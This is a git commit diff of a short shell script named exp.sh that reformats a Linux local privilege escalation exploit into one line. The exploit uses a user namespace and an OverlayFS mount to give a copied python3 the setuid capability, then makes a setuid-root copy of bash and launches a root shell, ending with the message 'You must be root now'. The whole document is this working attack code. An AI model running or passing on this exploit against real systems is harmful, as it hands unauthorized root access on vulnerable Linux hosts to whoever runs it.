422f7cacfb090509054c8d6cfe3f6254555b3752
Sanjay Ragavendar <91368803+SanjayRagavendar@users.noreply.github.com>
2024-02-29 22:42:20 +0530

    Update exp.sh

--- exp.sh
+++ exp.sh
@@ -2,11 +2,7 @@
 
 #Owner: Sanjay Ragavendar
 
-unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
-setcap cap_setuid+eip l/python3;
-mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;
-" && u/python3 -c 'import os;os.setuid(0);
-os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 
 echo "You must be root now"
 echo "If not check the version"
